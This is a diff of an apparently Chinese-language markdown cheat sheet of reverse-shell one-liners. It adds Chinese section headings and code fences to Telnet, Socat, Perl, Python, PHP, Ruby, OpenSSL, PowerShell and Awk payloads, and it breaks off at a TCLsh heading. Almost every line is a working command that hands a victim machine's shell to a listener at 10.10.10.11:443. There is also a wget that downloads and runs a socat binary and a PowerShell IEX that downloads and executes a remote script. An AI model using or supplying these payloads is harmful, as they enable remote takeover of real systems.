@@ -84,7 +84,7 @@ ncat 10.10.10.11 443 -e /bin/bash
 ncat --udp 10.10.10.11 443 -e /bin/bash
 ```
 
-## 5、Telnet:
+## 5、利用Telnet反弹shell
 首先在本地监听TCP协议443端口
 
 ```bash
@@ -104,92 +104,152 @@ rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet 10.10.10.11 443 > f
 rm -f x; mknod x p && telnet 10.10.10.11 443 0<x | /bin/bash 1>x
 ```
 
-## 6、Socat:
+## 6、使用Socat反弹shell
 首先在本地监听TCP协议443端口
 
 ```bash
 socat file:`tty`,raw,echo=0 TCP-L:443
 ```
 然后在靶机上执行如下命令：
-Victim:
+```bash
 /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.11:443
-Copy
+```
+```bash
 socat tcp-connect:10.10.10.11:443 exec:"bash -li",pty,stderr,setsid,sigint,sane
-Copy
-Listener:
-socat file:`tty`,raw,echo=0 TCP-L:443
-Copy
-Victim:
+```
+```bash
 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.11:443
-Copy
-## 7、Perl:
+```
+
+## 7、利用Perl脚本反弹
 首先在本地监听TCP协议443端口
 
 ```bash
 nc -lvp 443
 ```
 然后在靶机上执行如下命令：
-Victim:
+```bash
 perl -e 'use Socket;$i="10.10.10.11";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-Copy
+```
+```bash
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.10.11:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
-Copy
-Windows only, Victim:
+```
+win平台下执行：
+```bash
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.10.10.11:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
-Copy
-Python:
-IP v4
+```
+
+## 8、利用Python脚本反弹shell
+首先在本地监听TCP协议443端口
+
+```bash
+nc -lvp 443
+```
+然后在靶机上执行如下命令：
+
+
+IPv4协议如下：
+```bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.11",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-Copy
+```
+```bash
 export RHOST="10.10.10.11";export RPORT=443;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
-Copy
+```
+```bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.11",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
-Copy IP v6
+```
+IPv6协议如下：
+```bash 
 python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",443,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
-Copy Windows only:
+```
+Windows平台如下:
+```bash
 C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.10.10.11', 443)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
-Copy
-PHP:
+```
+
+## 9、利用PHP脚本反弹shell
+首先在本地监听TCP协议443端口
+
+```bash
+nc -lvp 443
+```
+然后在靶机上执行如下命令：
+
+```bash
 php -r '$sock=fsockopen("10.10.10.11",443);exec("/bin/sh -i <&3 >&3 2>&3");'
-Copy
+```
+```bash
 php -r '$s=fsockopen("10.10.10.11",443);$proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);'
-Copy
+```
+```bash
 php -r '$s=fsockopen("10.10.10.11",443);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
-Copy
+```
+```bash
 php -r '$s=fsockopen("10.10.10.11",443);`/bin/sh -i <&3 >&3 2>&3`;'
-Copy
+```
+```bash
 php -r '$s=fsockopen("10.10.10.11",443);system("/bin/sh -i <&3 >&3 2>&3");'
-Copy
+```
+```bash
 php -r '$s=fsockopen("10.10.10.11",443);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
-Copy
+```
+```bash
 php -r '$s=\'127.0.0.1\';$p=443;@error_reporting(0);@ini_set("error_log",NULL);@ini_set("log_errors",0);@set_time_limit(0);umask(0);if($s=fsockopen($s,$p,$n,$n)){if($x=proc_open(\'/bin/sh$IFS-i\',array(array(\'pipe\',\'r\'),array(\'pipe\',\'w\'),array(\'pipe\',\'w\')),$p,getcwd())){stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($s,0);while(true){if(feof($s))die(\'connection/closed\');if(feof($p[1]))die(\'shell/not/response\');$r=array($s,$p[1],$p[2]);stream_select($r,$n,$n,null);if(in_array($s,$r))fwrite($p[0],fread($s,1024));if(in_array($p[1],$r))fwrite($s,fread($p[1],1024));if(in_array($p[2],$r))fwrite($s,fread($p[2],1024));}fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($x);}else{die("proc_open/disabled");}}else{die("not/connect");}'
-Copy
-Ruby:
+```
+## 10、利用Ruby脚本反弹shell
+首先在本地监听TCP协议443端口
+
+```bash
+nc -lvp 443
+```
+然后在靶机上执行如下命令：
+
+```bash
 ruby -rsocket -e'f=TCPSocket.open("10.10.10.11",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
-Copy
+```
+```bash
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.10.11","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
-Copy
-NOTE: Windows only
+```
+Windows平台如下：
+```bash
 ruby -rsocket -e 'c=TCPSocket.new("10.10.10.11","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
-Copy
-OpenSSL:
-Attacker:
+```
+## 11、使用OpenSSL反弹shell
+首先在本地监听TCP协议443端口
+```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
-Copy
+```
+```bash
 openssl s_server -quiet -key key.pem -cert cert.pem -port 443
-Copy or
+```
+```bash
 ncat --ssl -vv -l -p 443
-Copy Victim:
+```
+然后在靶机上执行如下命令：
+```bash
 mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.10.11:443 > /tmp/s; rm /tmp/s
-Copy
-Powershell:
+```
+## 12、win平台下使用Powershell反弹shell
+首先在本地监听TCP协议443端口
+
+```bash
+nc -lvp 443
+```
+然后在靶机上执行如下命令：
+
+```bash
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.11",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-Copy
+```
+```bash
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.11',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-Copy
+```
+```bash
 powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
-Copy
+```
 Awk:
+
+```bash
+
 awk 'BEGIN {s = "/inet/tcp/0/10.10.10.11/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 Copy
 TCLsh
